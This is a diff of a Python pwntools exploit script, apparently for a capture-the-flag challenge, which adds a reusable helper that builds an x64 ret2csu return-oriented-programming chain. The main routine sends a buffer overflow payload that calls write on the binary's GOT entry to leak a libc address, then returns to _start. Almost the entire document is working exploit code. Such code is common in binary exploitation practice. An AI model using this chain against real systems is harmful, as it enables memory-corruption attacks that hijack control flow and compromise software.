@@ -26,16 +26,43 @@ elf = ELF(elf_name)
 io = remote(host, port) if len(sys.argv) > 1 else process(elf_name)
 
 
+def exp_x64_csu_init(
+    pop_rbx_addr: int,
+    ret_addr: int,
+    p_func_addr:int,
+    arg1:int,
+    arg2:int,
+    arg3:int
+):
+    """
+    仅适用于：
+        1. 三个参数以内函数
+        2. 溢出空间较大（> 120 bytes）
+        3. 第一个参数较小，例如write和read等
+    """
+    import struct
+    return b"".join([
+        struct.pack("<Q", pop_rbx_addr),
+        struct.pack("<Q", 0),  # pop     rbx
+        struct.pack("<Q", 1),  # pop     rbp
+        struct.pack("<Q", p_func_addr),  # pop     r12; call    qword ptr [r12+rbx*8]
+        struct.pack("<Q", arg3),  # pop     r13; mov     rdx, r13
+        struct.pack("<Q", arg2),  # pop     r14; mov     rsi, r14
+        struct.pack("<Q", arg1),  # pop     r15; mov     edi, r15d
+        7 * struct.pack("<Q", 0xcafebeefdeadface),
+        struct.pack("<Q", ret_addr),
+    ])
+
+
 def main():
     io.recvuntil("\n")
     POP_RBX = 0x4006AA  # => RDX
-    payload = flat((
-        "A" * (0x80 + 8),
-        p64(POP_RBX),
-        p64(8),  # r13 -> rdx
-        p64(elf.got["write"]),  # r14->
-        p64(1),
-    ))
+    payload = b"@" * (0x80 + 8) + exp_x64_csu_init(
+        POP_RBX,
+        elf.sym["_start"],
+        elf.got["write"],
+        1, elf.got["write"], 8
+    )
     io.send(payload)
     io.interactive()
 
